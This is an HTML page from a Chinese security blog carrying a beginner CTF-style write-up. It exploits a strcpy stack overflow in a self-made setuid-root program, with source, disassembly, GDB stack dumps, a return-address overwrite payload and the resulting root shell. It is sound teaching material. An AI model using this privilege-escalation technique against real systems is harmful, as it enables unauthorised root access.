@@ -1,0 +1,215 @@
+<!DOCTYPE html>
+<html lang=""><head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+
+    <title>一次简单的pwn题目</title>
+    <meta name="description" content="倾旋的博客">
+    <meta name="author" content='倾旋'>
+
+    <link href="https://fonts.googleapis.com/css2?family=Inconsolata:wght@400;700&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.5.3/dist/css/bootstrap.min.css" integrity="sha384-TX8t27EcRE3e/ihU7zmQxVncDAy5uIKz4rEkgIXeMed4M0jlfIDPvg6uqKI2xXr2" crossorigin="anonymous">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.3/css/all.min.css" integrity="sha512-iBBXm8fW90+nuLcSKlbmrPcLa0OT92xO1BIsZ+ywDWZCvqsWgccV3gFoRBv0z+8dLJgyAHIhR35VZc2oM/gI1w==" crossorigin="anonymous">
+
+    
+    <link rel="stylesheet" href="/sass/researcher.min.css">
+
+    
+        <link rel="icon" type="image/ico" href="https://payloads.online/favicon.ico">
+    
+
+    
+        
+    
+</head>
+
+    <body><div class="container mt-5">
+    <nav class="navbar navbar-expand-sm flex-column flex-sm-row text-nowrap p-0">
+        <a class="navbar-brand mx-0 mr-sm-auto" style="color: #dc3545;" href="https://payloads.online" title="倾旋的博客">
+          
+          倾旋的博客
+        </a>
+        <div class="navbar-nav flex-row flex-wrap justify-content-center">
+            
+                
+                
+                    <a class="nav-item nav-link" href="/about" title="About">
+                        About
+                    </a>
+                    
+                        <span class="nav-item navbar-text mx-1">/</span>
+                    
+                
+                    <a class="nav-item nav-link" href="/links/" title="Links">
+                        Links
+                    </a>
+                    
+                        <span class="nav-item navbar-text mx-1">/</span>
+                    
+                
+                    <a class="nav-item nav-link" href="/post/" title="Posts">
+                        Posts
+                    </a>
+                    
+                        <span class="nav-item navbar-text mx-1">/</span>
+                    
+                
+                    <a class="nav-item nav-link" href="/index.xml" title="Rss">
+                        Rss
+                    </a>
+                    
+                
+            
+        </div>
+    </nav>
+</div>
+<hr>
+<div id="content">
+<div class="container">
+    <p>一次简单的pwn题目</p>
+<h2 id="0x01-背景介绍">0x01 背景介绍</h2>
+<p><img src="https://rvn0xsy.oss-cn-shanghai.aliyuncs.com/2018-11-06/89878547F623C64F0C41D9A5E04DD0E1.jpg" alt="0x01"></p>
+<p><img src="https://rvn0xsy.oss-cn-shanghai.aliyuncs.com/2018-11-06/A0240C8DD946466BBD6385370A450BE1.jpg" alt="0x02"></p>
+<p>在A师傅的带领下，我假想了一个pwn简单题目，非常适合新手中的新手，其实发出来有点丢人的。</p>
+<p>题目背景是这样的：</p>
+<p>小Q登录上了一个服务器，他的用户名是<code>rvn0xsy</code>，没有root权限，在home目录里发现了一个名为flag.txt的文件，很明显要获得flag.txt的内容，但是事情并没有那么简单……</p>
+<p>小Q踏上了艰辛的旅程。</p>
+<h2 id="0x02-初入江湖">0x02 初入江湖</h2>
+<p>小Q查看了一下目录文件：</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sh" data-lang="sh">rvn0xsy@ubuntu:~/Pwn$ ll
+total <span style="color:#ae81ff">44</span>
+drwxrwxr-x  <span style="color:#ae81ff">2</span> rvn0xsy rvn0xsy <span style="color:#ae81ff">4096</span> Nov  <span style="color:#ae81ff">5</span> 19:50 ./
+drwxr-xr-x <span style="color:#ae81ff">20</span> rvn0xsy rvn0xsy <span style="color:#ae81ff">4096</span> Nov  <span style="color:#ae81ff">5</span> 09:47 ../
+-rwsr-sr-x  <span style="color:#ae81ff">1</span> root    root    <span style="color:#ae81ff">8487</span> Nov  <span style="color:#ae81ff">5</span> 09:48 a.out*
+-rw-------  <span style="color:#ae81ff">1</span> root    rvn0xsy    <span style="color:#ae81ff">6</span> Nov  <span style="color:#ae81ff">5</span> 19:50 flag.txt
+-rw-rw-r--  <span style="color:#ae81ff">1</span> rvn0xsy rvn0xsy  <span style="color:#ae81ff">317</span> Nov  <span style="color:#ae81ff">5</span> 09:48 pwn.c
+rvn0xsy@ubuntu:~/Pwn$ cat flag.txt 
+cat: flag.txt: Permission denied
+rvn0xsy@ubuntu:~/Pwn$ 
+</code></pre></div><p>发现了flag.txt，没有权限读取 :(</p>
+<p>只能把目光转向<code>a.out</code>，这个文件似乎不是那么简单，它具有S属性，如果我们能够通过它来执行命令的话……那肯定可以读取flag.txt ！！</p>
+<p>旁边还有一个pwn.c，会不会是它的源码呢？</p>
+<h2 id="0x03-踏上征程">0x03 踏上征程</h2>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sh" data-lang="sh">rvn0xsy@ubuntu:~/Pwn$ cat -n pwn.c 
+     1	<span style="color:#75715e">#include &lt;stdio.h&gt;</span>
+     2	<span style="color:#75715e">#include &lt;unistd.h&gt;</span>
+     3	<span style="color:#75715e">#include &lt;string.h&gt;</span>
+     4	<span style="color:#75715e">#include &lt;stdlib.h&gt;</span>
+     5	
+     6	int bash<span style="color:#f92672">()</span>;
+     7	
+     8	int main<span style="color:#f92672">(</span>int argc,char * argv<span style="color:#f92672">[]){</span>
+     9		setuid<span style="color:#f92672">(</span>0<span style="color:#f92672">)</span>;
+    10		<span style="color:#66d9ef">if</span><span style="color:#f92672">(</span>argv<span style="color:#f92672">[</span>1<span style="color:#f92672">]</span> <span style="color:#f92672">==</span> NULL<span style="color:#f92672">){</span>
+    11			printf<span style="color:#f92672">(</span><span style="color:#e6db74">&#34;usage : %s input string \n&#34;</span>,argv<span style="color:#f92672">[</span>0<span style="color:#f92672">])</span>;
+    12			exit<span style="color:#f92672">(</span>-1<span style="color:#f92672">)</span>;
+    13		<span style="color:#f92672">}</span>
+    14		char a<span style="color:#f92672">[</span>20<span style="color:#f92672">]</span>;
+    15		strcpy<span style="color:#f92672">(</span>a,argv<span style="color:#f92672">[</span>1<span style="color:#f92672">])</span>;
+    16		printf<span style="color:#f92672">(</span><span style="color:#e6db74">&#34;%s \n&#34;</span>,a<span style="color:#f92672">)</span>;
+    17	<span style="color:#f92672">}</span>
+    18	
+    19	int bash<span style="color:#f92672">(){</span>
+    20	  system<span style="color:#f92672">(</span><span style="color:#e6db74">&#34;/bin/bash&#34;</span><span style="color:#f92672">)</span>;
+    21	<span style="color:#f92672">}</span>
+rvn0xsy@ubuntu:~/Pwn$ 
+</code></pre></div><p>可以看到<code>main</code>函数中有一个<code>setuid(0);</code>，它将具有S属性的程序设置为root权限运行，其次该文件中还有一个<code>bash</code>函数，灵光乍现！ 如果执行了<code>setuid(0);</code>再调用<code>bash</code>函数就可以获得一个root权限的bash shell。</p>
+<p>但是main函数中并没有调用bash函数，这个怎么办呢？</p>
+<p>焦虑的小Q又会想起当年学习C语言时，自己触发过N次的<code>segment fault</code>，是由于它没有检查<code>strcpy</code>参数传入的长度，导致覆盖了数组边界。</p>
+<p>但是其背后引出的问题都不是那么简单，上面只是普通程序员所理解的程度，而要深入问题的本质，还是要看汇编代码：</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sh" data-lang="sh">&gt;&gt;&gt; disassemble main 
+Dump of assembler code <span style="color:#66d9ef">for</span> <span style="color:#66d9ef">function</span> main:
+   0x080484dd &lt;+0&gt;:	push   ebp ;将栈基地址压入栈
+   0x080484de &lt;+1&gt;:	mov    ebp,esp ;设置当前栈指针地址为基址
+   0x080484e0 &lt;+3&gt;:	and    esp,0xfffffff0
+   0x080484e3 &lt;+6&gt;:	sub    esp,0x30 ;将esp向后增长30（16进制<span style="color:#f92672">=</span>&gt;48字节）位 给char a<span style="color:#f92672">[</span>20<span style="color:#f92672">]</span>分配的也在其中
+   0x080484e6 &lt;+9&gt;:	mov    DWORD PTR <span style="color:#f92672">[</span>esp<span style="color:#f92672">]</span>,0x0
+   0x080484ed &lt;+16&gt;:	call   0x80483d0 &lt;setuid@plt&gt; ; 调用setuid<span style="color:#f92672">(</span>0<span style="color:#f92672">)</span>
+   0x080484f2 &lt;+21&gt;:	mov    eax,DWORD PTR <span style="color:#f92672">[</span>ebp+0xc<span style="color:#f92672">]</span>
+   0x080484f5 &lt;+24&gt;:	add    eax,0x4
+   0x080484f8 &lt;+27&gt;:	mov    eax,DWORD PTR <span style="color:#f92672">[</span>eax<span style="color:#f92672">]</span>
+   0x080484fa &lt;+29&gt;:	test   eax,eax
+   0x080484fc &lt;+31&gt;:	jne    0x804851f &lt;main+66&gt; ; 判断argv<span style="color:#f92672">[</span>1<span style="color:#f92672">]</span>是否为空
+   0x080484fe &lt;+33&gt;:	mov    eax,DWORD PTR <span style="color:#f92672">[</span>ebp+0xc<span style="color:#f92672">]</span>
+   0x08048501 &lt;+36&gt;:	mov    eax,DWORD PTR <span style="color:#f92672">[</span>eax<span style="color:#f92672">]</span>
+   0x08048503 &lt;+38&gt;:	mov    DWORD PTR <span style="color:#f92672">[</span>esp+0x4<span style="color:#f92672">]</span>,eax
+   0x08048507 &lt;+42&gt;:	mov    DWORD PTR <span style="color:#f92672">[</span>esp<span style="color:#f92672">]</span>,0x8048600
+   0x0804850e &lt;+49&gt;:	call   0x8048370 &lt;printf@plt&gt; ; 调用printf
+   0x08048513 &lt;+54&gt;:	mov    DWORD PTR <span style="color:#f92672">[</span>esp<span style="color:#f92672">]</span>,0xffffffff
+   0x0804851a &lt;+61&gt;:	call   0x80483b0 &lt;exit@plt&gt; ; 退出
+   0x0804851f &lt;+66&gt;:	mov    eax,DWORD PTR <span style="color:#f92672">[</span>ebp+0xc<span style="color:#f92672">]</span>
+   0x08048522 &lt;+69&gt;:	add    eax,0x4
+   0x08048525 &lt;+72&gt;:	mov    eax,DWORD PTR <span style="color:#f92672">[</span>eax<span style="color:#f92672">]</span>
+   0x08048527 &lt;+74&gt;:	mov    DWORD PTR <span style="color:#f92672">[</span>esp+0x4<span style="color:#f92672">]</span>,eax
+   0x0804852b &lt;+78&gt;:	lea    eax,<span style="color:#f92672">[</span>esp+0x1c<span style="color:#f92672">]</span>
+   0x0804852f &lt;+82&gt;:	mov    DWORD PTR <span style="color:#f92672">[</span>esp<span style="color:#f92672">]</span>,eax
+   0x08048532 &lt;+85&gt;:	call   0x8048380 &lt;strcpy@plt&gt;
+   0x08048537 &lt;+90&gt;:	lea    eax,<span style="color:#f92672">[</span>esp+0x1c<span style="color:#f92672">]</span>
+   0x0804853b &lt;+94&gt;:	mov    DWORD PTR <span style="color:#f92672">[</span>esp+0x4<span style="color:#f92672">]</span>,eax
+   0x0804853f &lt;+98&gt;:	mov    DWORD PTR <span style="color:#f92672">[</span>esp<span style="color:#f92672">]</span>,0x804861a
+   0x08048546 &lt;+105&gt;:	call   0x8048370 &lt;printf@plt&gt; ; 输出 a
+   0x0804854b &lt;+110&gt;:	leave  
+   0x0804854c &lt;+111&gt;:	ret    
+End of assembler dump.
+</code></pre></div><p>在<code>strcpy</code>处设置断点，栈情况：</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sh" data-lang="sh"><span style="color:#f92672">[</span>------------------------------------stack-------------------------------------<span style="color:#f92672">]</span>
+0000| 0xbfe74180 --&gt; 0x0 
+0004| 0xbfe74184 --&gt; 0x2f <span style="color:#f92672">(</span><span style="color:#e6db74">&#39;/&#39;</span><span style="color:#f92672">)</span>
+0008| 0xbfe74188 --&gt; 0x804a000 --&gt; 0x8049f14 --&gt; 0x1 
+0012| 0xbfe7418c --&gt; 0x80485c2 <span style="color:#f92672">(</span>&lt;__libc_csu_init+82&gt;:	add    edi,0x1<span style="color:#f92672">)</span>
+0016| 0xbfe74190 --&gt; 0x2 
+0020| 0xbfe74194 --&gt; 0xbfe74254 --&gt; 0xbfe75921 <span style="color:#f92672">(</span><span style="color:#e6db74">&#34;/home/rvn0xsy/Pwn/a.out&#34;</span><span style="color:#f92672">)</span>
+0024| 0xbfe74198 --&gt; 0xbfe74260 --&gt; 0xbfe7593d <span style="color:#f92672">(</span><span style="color:#e6db74">&#34;SHELL=/bin/bash&#34;</span><span style="color:#f92672">)</span>
+0028| 0xbfe7419c --&gt; 0xb755164d <span style="color:#f92672">(</span>&lt;__cxa_atexit+29&gt;:	test   eax,eax<span style="color:#f92672">)</span>
+</code></pre></div><p><code>0xbfe75921</code>就是<code>argv</code>数组的首地址</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sh" data-lang="sh">&gt;&gt;&gt; x /8s 0xbfe75921
+0xbfe75921:	<span style="color:#e6db74">&#34;/home/rvn0xsy/Pwn/a.out&#34;</span>
+0xbfe75939:	<span style="color:#e6db74">&#34;123&#34;</span>
+0xbfe7593d:	<span style="color:#e6db74">&#34;SHELL=/bin/bash&#34;</span>
+0xbfe7594d:	<span style="color:#e6db74">&#34;TERM=xterm&#34;</span>
+0xbfe75958:	<span style="color:#e6db74">&#34;USER=rvn0xsy&#34;</span>
+0xbfe75962:	<span style="color:#e6db74">&#34;LS_COLORS=rs=0:di=01;34:ln=01;36:mh=00:pi=40;33:so=01;35:do=01;35:bd=40;33;01:cd=40;33;01:or=40;31;01:su=37;41:sg=30;43:ca=30;41:tw=30;42:ow=34;42:st=37;44:ex=01;32:*.tar=01;31:*.tgz=01;31:*.arj=01;31&#34;</span>...
+0xbfe75a2a:	<span style="color:#e6db74">&#34;:*.taz=01;31:*.lzh=01;31:*.lzma=01;31:*.tlz=01;31:*.txz=01;31:*.zip=01;31:*.z=01;31:*.Z=01;31:*.dz=01;31:*.gz=01;31:*.lz=01;31:*.xz=01;31:*.bz2=01;31:*.bz=01;31:*.tbz=01;31:*.tbz2=01;31:*.tz=01;31:*.d&#34;</span>...
+0xbfe75af2:	<span style="color:#e6db74">&#34;eb=01;31:*.rpm=01;31:*.jar=01;31:*.war=01;31:*.ear=01;31:*.sar=01;31:*.rar=01;31:*.ace=01;31:*.zoo=01;31:*.cpio=01;31:*.7z=01;31:*.rz=01;31:*.jpg=01;35:*.jpeg=01;35:*.gif=01;35:*.bmp=01;35:*.pbm=01;35&#34;</span>...
+&gt;&gt;&gt; 
+</code></pre></div><p>可以看到，我们传入的<code>123</code>在<code>0xbfe75939</code></p>
+<p>通过计算<code>strcpy()</code>的栈偏移量，我们可以确定<code>0xbfe75939</code>到<code>ESP</code>中函数返回值的空间有<code>0xc</code>这个长度。</p>
+<p>由于还有内存对齐的缘故，所以缓冲区的大小应该是32，再向后4个字节就是strcpy的下一条指令的地址</p>
+<h2 id="0x04-小有成绩">0x04 小有成绩</h2>
+<p>获得bash函数的地址：</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sh" data-lang="sh">&gt;&gt;&gt; p bash
+$1 <span style="color:#f92672">=</span> <span style="color:#f92672">{</span>int <span style="color:#f92672">()}</span> 0x804854d &lt;bash&gt;
+&gt;&gt;&gt; 
+</code></pre></div><p>构造shellcode：</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sh" data-lang="sh">python -c <span style="color:#e6db74">&#34;print &#39;x&#39;*32+&#39;\x4d\x85\x04\x08&#39;&#34;</span>&gt; exploit.txt
+</code></pre></div><h2 id="0x05-修仙完毕">0x05 修仙完毕</h2>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sh" data-lang="sh">rvn0xsy@ubuntu:~/Pwn$ ./a.out <span style="color:#66d9ef">$(</span>cat exploit.txt<span style="color:#66d9ef">)</span>
+xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxM� 
+bash-4.3# cat flag.txt 
+<span style="color:#ae81ff">12580</span>
+bash-4.3# id
+uid<span style="color:#f92672">=</span>0<span style="color:#f92672">(</span>root<span style="color:#f92672">)</span> gid<span style="color:#f92672">=</span>1000<span style="color:#f92672">(</span>rvn0xsy<span style="color:#f92672">)</span> groups<span style="color:#f92672">=</span>0<span style="color:#f92672">(</span>root<span style="color:#f92672">)</span>,4<span style="color:#f92672">(</span>adm<span style="color:#f92672">)</span>,24<span style="color:#f92672">(</span>cdrom<span style="color:#f92672">)</span>,27<span style="color:#f92672">(</span>sudo<span style="color:#f92672">)</span>,30<span style="color:#f92672">(</span>dip<span style="color:#f92672">)</span>,46<span style="color:#f92672">(</span>plugdev<span style="color:#f92672">)</span>,108<span style="color:#f92672">(</span>lpadmin<span style="color:#f92672">)</span>,125<span style="color:#f92672">(</span>sambashare<span style="color:#f92672">)</span>,1000<span style="color:#f92672">(</span>rvn0xsy<span style="color:#f92672">)</span>
+bash-4.3# exit
+exit
+Segmentation fault <span style="color:#f92672">(</span>core dumped<span style="color:#f92672">)</span>
+rvn0xsy@ubuntu:~/Pwn$ 
+</code></pre></div><p>flag.txt内容是12580，退出的时候，是由于EIP寄存器指向了一个非指令内存区域，导致段地址错误。</p>
+</div>
+
+        </div><div id="footer" class="mb-5">
+    <hr>
+    <div class="container text-center">
+        
+            <a href="https://twitter.com/Rvn0xsy" class="fab fa-twitter fa-1x" title="Twitter"></a>
+        
+            <a href="mailto:rvn0xsy@gmail.com" class="fas fa-envelope fa-1x" title="E-mail"></a>
+        
+    </div>
+    
+        <div class="container text-center">
+            <a href="https://payloads.online" title="- PAYLOADS.ONLINE -"><small>- PAYLOADS.ONLINE -</small></a>
+        </div>
+    
+</div>
+</body>
+</html>
